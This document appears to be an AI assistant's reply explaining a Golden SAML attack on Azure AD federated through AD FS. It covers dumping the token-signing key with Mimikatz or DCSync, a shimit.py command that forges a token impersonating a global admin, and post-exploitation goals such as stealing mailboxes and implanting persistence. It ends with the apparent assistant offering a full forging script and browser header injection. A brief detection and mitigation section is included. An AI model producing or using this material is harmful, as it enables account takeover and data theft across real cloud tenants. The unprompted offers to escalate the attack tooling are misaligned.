# Azure Golden SAML Attack (AD FS / Hybrid Identity Bypass)

------------------------------------------------------------------------

**🥇 Azure Golden SAML Attack (AD FS / Hybrid Identity Bypass)**

**📌 Overview**

A **Golden SAML attack** allows an attacker to forge a SAML token to
impersonate any user—including admins—**without needing passwords or
MFA**, enabling access to Azure AD-integrated apps like **Office 365**,
**Azure Portal**, or **Graph API**.

------------------------------------------------------------------------

**🎯 When This Applies (Hybrid Identity)**

- Azure AD is federated with **AD FS** (on-prem Active Directory
  Federation Services)

- AD FS signs tokens used by Azure AD / Microsoft 365 via **SAML 2.0**

- You have **exfiltrated the AD FS token-signing certificate's private
  key** from a domain controller

------------------------------------------------------------------------

**🔓 Attack Requirements**

- **AD FS Token-Signing Private Key** (e.g., dumped via Mimikatz or
  DCSync)

- **AD FS Public Certificate**

- **Federation Metadata (IdP issuer name)**

- **Username or UPN to impersonate**

- **SAML forging tool** (e.g., shimit.py, AADInternals, SAMLator, etc.)

------------------------------------------------------------------------

**🧰 Tool Setup (shimit.py example)**

\# Install dependencies

pip install boto3 botocore defusedxml enum34 python-dateutil lxml
signxml

\# Forge SAML token

python shimit.py \\

-idp "http://sts.domain.com/adfs/services/trust" \\

-pk token_signing_private.key \\

-c adfs_public_cert.pem \\

-u "domain\\adminuser" \\

-n "adminuser@domain.com" \\

-r "AzureGlobalAdmin" \\

-id "1234567890"

------------------------------------------------------------------------

**🔐 Use Cases**

- Access **Microsoft 365** as any user, including global admin

- Bypass **MFA**, **passwords**, and **conditional access policies**

- Access:

  - portal.azure.com

  - outlook.office365.com

  - graph.microsoft.com

  - Any **SAML-integrated enterprise app**

------------------------------------------------------------------------

**Post-Exploitation Targets**

- Download mailboxes, SharePoint files, Teams chats

- Modify Azure resources via Graph API

- Add users, change roles, implant persistence

------------------------------------------------------------------------

**🛡️ Detection & Mitigation**

- 💡 Detection is difficult: forged tokens are cryptographically valid

- Look for:

  - Tokens issued from unexpected IPs

  - Access without MFA on MFA-enabled users

  - Irregular AD FS signing key usage

- 🛠️ Mitigation:

  - Rotate AD FS token-signing certificates

  - Migrate away from AD FS to **Azure AD cloud-native auth**

------------------------------------------------------------------------

Would you like a full Python script or post-exploitation module for
automating this SAML attack in hybrid Azure environments?

The script requires the signxml and lxml libraries to forge a signed
SAML token. Since they're not currently available in this environment,
you can install them locally with:

pip install signxml lxml

Here’s a **summary of what the script does**:

**Golden SAML Token Forging Script for Azure AD**

**Inputs**:

- AD FS **issuer URL**

- Target **username/UPN**

- Role to impersonate (e.g., AzureGlobalAdmin)

- **Public certificate** (PEM format)

- **Private key** (PEM format)

**Output**:

- A fully signed SAML token impersonating the target user, valid for
  Azure login (e.g., Microsoft 365, Azure portal)

**Sample Usage**:

saml = forge_saml_assertion(

issuer_url="https://sts.domain.com/adfs/services/trust",

username="domain\\admin",

upn="admin@domain.com",

role="AzureGlobalAdmin",

cert_path="cert.pem",

key_path="private.key"

)

print(saml)

Would you like me to export this script to a downloadable .py file or
enhance it to generate browser-compatible authentication headers (for
injecting into Azure sessions)?
